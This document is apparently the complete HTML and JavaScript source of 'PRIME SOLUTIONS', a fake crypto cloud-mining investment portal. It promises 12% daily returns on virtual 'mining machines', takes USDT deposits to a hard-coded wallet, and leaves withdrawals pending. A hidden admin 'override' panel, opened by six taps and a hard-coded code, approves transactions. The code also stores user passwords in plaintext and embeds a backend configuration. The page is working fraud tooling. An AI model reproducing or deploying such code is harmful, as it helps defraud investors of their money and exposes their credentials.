<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PRIME SOLUTIONS | Institutional Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --p-gold: #B8860B; --p-blue: #0A192F; --p-bg: #F9FAFB; }
        body { background: var(--p-bg); color: #111; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        .prime-card { background: #fff; border: 1px solid #E5E7EB; border-radius: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.03); }
        .btn-prime { background: linear-gradient(135deg, #B8860B, #D4AF37); color: #fff; font-weight: 700; border-radius: 14px; transition: 0.3s; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
        .btn-prime:active { transform: scale(0.96); }
        .screen { display: none; padding-bottom: 120px; animation: fadeIn 0.4s ease-out; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #fff; border-top: 1px solid #EEE; display: flex; justify-content: space-around; padding: 18px; z-index: 1000; }
        .nav-item { color: #9CA3AF; font-size: 10px; font-weight: 700; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: var(--p-gold); }
        .p-input { background: #F3F4F6; border: 1px solid #E5E7EB; width: 100%; padding: 16px; border-radius: 14px; color: #111; outline: none; margin-bottom: 12px; }
        .p-input:focus { border-color: var(--p-gold); background: #fff; }
        .modal { display: none; position: fixed; inset: 0; background: #fff; z-index: 2000; padding: 25px; overflow-y: auto; }
        .timer-box { background: #0A192F; color: var(--p-gold); padding: 10px; border-radius: 12px; font-family: monospace; font-weight: 800; font-size: 18px; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="mb-10">
            <h1 onclick="handleTaps()" class="text-3xl font-extrabold text-gray-900 tracking-tight">PRIME<span class="text-[#B8860B]">SOLUTIONS</span></h1>
            <p class="text-xs text-gray-400 font-semibold mt-2 uppercase tracking-widest">Global Asset Distribution</p>
        </div>
        <div class="prime-card p-6 mb-8 bg-blue-50/50 border-blue-100">
            <h2 class="text-sm font-bold text-blue-900 mb-1 italic">Welcome to the Institution,</h2>
            <p class="text-[11px] text-blue-800/70 leading-relaxed">Securely manage your high-frequency mining clusters and institutional hash-rate through our audited distributor portal.</p>
        </div>
        <div class="space-y-2">
            <input type="text" id="u-email" placeholder="Institutional Email / ID" class="p-input">
            <input type="password" id="u-pass" placeholder="Access Passkey" class="p-input">
            <input type="text" id="adm-key" placeholder="System Override Code" class="hidden p-input border-gold">
            <button onclick="auth()" class="w-full btn-prime py-5 shadow-lg">Authenticate Session</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[11px] mt-8 text-gray-400 font-bold uppercase cursor-pointer">Register New Node</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center sticky top-0 bg-white/95 backdrop-blur-md z-50 border-b">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 bg-[#B8860B] rounded-lg flex items-center justify-center text-white font-bold text-xs">P</div>
                <p id="user-display" class="text-[10px] font-extrabold uppercase text-gray-700"></p>
            </div>
            <i onclick="logout()" class="fa-solid fa-power-off text-gray-300"></i>
        </header>

        <div id="dash-screen" class="screen active-screen px-5 pt-4">
            <div class="prime-card p-8 mb-6 text-center border-b-4 border-[#B8860B]">
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2 tracking-[2px]">Net Institutional Balance</p>
                <h1 id="main-bal" class="text-5xl font-extrabold tracking-tighter text-gray-900">$0.00</h1>
                <p id="v-daily" class="text-[11px] font-bold text-green-600 mt-4 uppercase">Yield: +$0.00 / 24H</p>
            </div>

            <div class="prime-card p-6 mb-6 text-center">
                <p class="text-[9px] font-bold text-gray-400 uppercase mb-3 tracking-widest">Next Yield Distribution</p>
                <div class="flex justify-center gap-2">
                    <div id="t-hour" class="timer-box">00</div><span class="text-gray-300 font-bold">:</span>
                    <div id="t-min" class="timer-box">00</div><span class="text-gray-300 font-bold">:</span>
                    <div id="t-sec" class="timer-box">00</div>
                </div>
                <p class="text-[9px] text-gray-400 mt-3 italic font-semibold">Bonus assets will be credited automatically.</p>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('dep-modal')" class="prime-card p-6 flex flex-col items-center gap-2 text-gray-700"><i class="fa-solid fa-square-plus text-[#B8860B] text-xl"></i><span class="text-[9px] font-bold uppercase">Funding</span></button>
                <button onclick="openModal('wd-modal')" class="prime-card p-6 flex flex-col items-center gap-2 text-gray-700"><i class="fa-solid fa-money-bill-transfer text-xl"></i><span class="text-[9px] font-bold uppercase">Extract</span></button>
            </div>

            <div class="prime-card p-5 mb-6 flex items-center gap-4 bg-gray-50/50">
                <div class="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm"><i class="fa-solid fa-medal text-[#B8860B]"></i></div>
                <div>
                    <h4 class="text-[10px] font-extrabold uppercase">Verified Distributor</h4>
                    <p class="text-[9px] text-gray-500 font-medium">Licensed Institutional Partner #88219-X</p>
                </div>
            </div>

            <div class="prime-card p-5 mb-6">
                <div class="flex gap-2">
                    <input type="text" id="promo-inp" placeholder="PROMO VOUCHER" class="p-input mb-0 py-3 text-[10px] font-bold uppercase flex-1 border-none bg-gray-50">
                    <button onclick="applyPromo()" class="btn-prime px-6">Apply</button>
                </div>
            </div>

            <div class="prime-card p-5 flex justify-between items-center mb-6">
                <div class="text-[10px] font-bold text-gray-400">AFFILIATE NODE: <span id="ref-id" class="text-gray-800 ml-1">--</span></div>
                <button onclick="alert('Copied!')" class="text-[10px] font-bold text-[#B8860B] underline uppercase">Copy</button>
            </div>
        </div>

        <div id="mine-screen" class="screen px-5 pt-4">
            <h2 class="text-xl font-extrabold mb-6 text-gray-900 italic">MINING <span class="text-[#B8860B]">FLEET</span></h2>
            <div id="nodes-container" class="space-y-6"></div>
        </div>

        <div id="hist-screen" class="screen px-5 pt-4">
            <h2 class="text-xl font-extrabold mb-6 text-gray-900 italic">AUDIT <span class="text-[#B8860B]">LOGS</span></h2>
            <div id="hist-container" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-chart-pie text-lg"></i><span>PORTFOLIO</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-microchip text-lg"></i><span>MACHINES</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-clipboard-check text-lg"></i><span>AUDIT</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div onclick="closeModal('dep-modal')" class="mb-8 text-gray-400 font-bold text-[10px] uppercase"><i class="fa-solid fa-chevron-left mr-2"></i>Exit</div>
        <h2 class="text-3xl font-extrabold mb-8">FUNDING PORTAL</h2>
        <select id="dep-method" class="p-input" onchange="updateAddr()">
            <option value="USDT">USDT (TRC20) - Direct Sync</option>
            <option value="Local">Local Financial Transfer</option>
        </select>
        <div class="prime-card p-6 mb-8 text-center bg-gray-50">
            <p id="dep-addr" class="text-[11px] font-mono break-all text-gray-500">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="dep-tid" placeholder="Transaction Reference (TID)" class="p-input">
        <input type="file" id="dep-proof" accept="image/*" class="text-[10px] mb-8 font-bold">
        <button onclick="requestFin('Deposit')" class="w-full btn-prime py-5">Initiate Transfer</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-8 text-gray-400 font-bold text-[10px] uppercase"><i class="fa-solid fa-chevron-left mr-2"></i>Exit</div>
        <h2 class="text-3xl font-extrabold mb-8 text-red-600 italic">EXTRACTION</h2>
        <input type="number" id="wd-amt" placeholder="Extraction Amount ($)" class="p-input">
        <input type="text" id="wd-acc" placeholder="Target Account Holder / Wallet" class="p-input">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-gray-900 text-white font-bold py-5 rounded-2xl text-[11px] uppercase">Process Payment</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-white z-[9999] p-8 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 pb-4 border-b">
            <h2 class="font-extrabold text-[#B8860B] uppercase text-sm">PRIME OVERRIDE SYSTEM</h2>
            <button onclick="location.reload()" class="text-red-500 font-bold text-[10px]">DISCONNECT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('prime_session'); let login = true;

        if(user) start(user);

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            if(document.getElementById('adm-key').value === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadA(); return; }
            if(!id || !pw) return alert("Credentials Missing");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!login) {
                if(s.exists()) return alert("Identity already exists.");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, ref: "PRIME-" + Math.floor(1000+Math.random()*9000) });
                localStorage.setItem('prime_session', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('prime_session', id); start(id);
            } else alert("Authorization Failed.");
        };

        function start(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const r = d.data();
                document.getElementById('main-bal').innerText = "$" + (r.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Yield: +$" + (r.daily || 0).toFixed(2) + " / 24H";
                document.getElementById('ref-id').innerText = r.ref;
                document.getElementById('user-display').innerText = id;
            });
            loadH(); loadN(); startTimer();
        }

        window.logout = () => { localStorage.removeItem('prime_session'); location.reload(); };

        // ⏱️ TIMER LOGIC
        function startTimer() {
            setInterval(() => {
                const now = new Date();
                const h = 23 - now.getHours(); const m = 59 - now.getMinutes(); const s = 59 - now.getSeconds();
                document.getElementById('t-hour').innerText = String(h).padStart(2,'0');
                document.getElementById('t-min').innerText = String(m).padStart(2,'0');
                document.getElementById('t-sec').innerText = String(s).padStart(2,'0');
            }, 1000);
        }

        // 🏗️ 20 MINING MACHINES ($20 - $20,000)
        function loadN() {
            const c = document.getElementById('nodes-container'); c.innerHTML = "";
            const imgs = ["https://images.unsplash.com/photo-1624365169192-6997bb1f43c8?q=80&w=400", "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400", "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=400"];
            for(let i=1; i<=20; i++) {
                let price = i === 1 ? 20 : (i === 20 ? 20000 : i * 500); 
                let daily = (price * 0.12).toFixed(2);
                c.innerHTML += `<div class="prime-card overflow-hidden">
                    <img src="${imgs[i%3]}" class="w-full h-36 object-cover grayscale hover:grayscale-0 transition-all duration-700">
                    <div class="p-6">
                        <div class="flex justify-between items-start mb-4">
                            <div><h4 class="font-extrabold text-sm uppercase">PRIME UNIT v.${i}</h4><p class="text-[9px] text-gray-400 font-bold">ASIC Institutional Hardware</p></div>
                            <span class="bg-[#B8860B]/10 text-[#B8860B] text-[10px] font-black px-3 py-1 rounded-full">$${price}</span>
                        </div>
                        <div class="flex justify-between items-center bg-gray-50 p-4 rounded-xl">
                            <div><p class="text-[8px] font-bold text-gray-400 uppercase">Daily Profit</p><p class="text-lg font-extrabold text-green-600">+$${daily}</p></div>
                            <button onclick="buyN(${price},${daily})" class="btn-prime px-8 py-3">Deploy</button>
                        </div>
                    </div>
                </div>`;
            }
        }

        window.buyN = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Liquidity Error: Please fund your account.");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Node Deployed to Fleet.");
        };

        window.requestFin = async (type) => {
            let p = { user, type, status: 'Pending', time: Date.now() };
            if(type === 'Deposit') {
                p.amount = parseFloat(document.getElementById('dep-amt').value);
                p.tid = document.getElementById('dep-tid').value;
                const f = document.getElementById('dep-proof').files[0];
                if(f) { const r = new FileReader(); r.onloadend = async () => { p.proof = r.result; await addDoc(collection(db, "logs"), p); alert("Submitted"); closeModal('dep-modal'); }; r.readAsDataURL(f); }
                else { await addDoc(collection(db, "logs"), p); alert("Submitted"); closeModal('dep-modal'); }
            } else {
                p.amount = parseFloat(document.getElementById('wd-amt').value);
                p.acc = document.getElementById('wd-acc').value;
                const uR = doc(db, "users", user); const s = await getDoc(uR);
                if(s.data().balance < p.amount) return alert("Insufficient Assets.");
                await updateDoc(uR, { balance: s.data().balance - p.amount });
                await addDoc(collection(db, "logs"), p); alert("Withdrawal in Process"); closeModal('wd-modal');
            }
        };

        function loadH() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user), orderBy("time", "desc")), s => {
                const container = document.getElementById('hist-container'); container.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    container.innerHTML += `<div class="prime-card p-5 flex justify-between items-center">
                        <div><p class="text-[8px] font-bold text-gray-400 uppercase tracking-widest">${r.type}</p><p class="text-sm font-extrabold">$${r.amount}</p></div>
                        <span class="text-[9px] font-extrabold ${r.status=='Pending'?'text-yellow-500':'text-green-500'} bg-gray-50 px-3 py-1 rounded-full uppercase">${r.status}</span>
                    </div>`;
                });
            });
        }

        // 👑 ADMIN POWERS
        function loadA() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const l = document.getElementById('adm-list'); l.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    l.innerHTML += `<div class="prime-card p-5 bg-gray-50 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'}">
                        <div class="flex justify-between mb-2"><span class="text-[10px] font-bold uppercase">${r.user}</span><span class="font-black">$${r.amount}</span></div>
                        <p class="text-[8px] text-gray-400 mb-4">TYPE: ${r.type} | REF: ${r.tid || r.acc}</p>
                        ${r.proof ? `<button onclick="window.open('${r.proof}')" class="text-blue-500 text-[9px] font-black underline block mb-4 uppercase">View Audit Image</button>` : ''}
                        <div class="flex gap-2"><button onclick="admAct('${d.id}','${r.user}',${r.amount},'${r.type}','Success')" class="bg-green-600 text-white flex-1 py-3 rounded-xl text-[9px] font-bold">APPROVE</button></div>
                    </div>`;
                });
            });
        }

        window.admAct = async (id, u, a, t, s) => { if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: s }); };
        window.applyPromo = async () => { if(document.getElementById('promo-inp').value === "PRIME100") { const uR = doc(db, "users", user); const s = await getDoc(uR); await updateDoc(uR, { balance: s.data().balance + 100 }); alert("Coupon Success!"); } };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { login = !login; document.getElementById('m-text').innerText = login ? "Register New Node" : "Back to Authentication"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
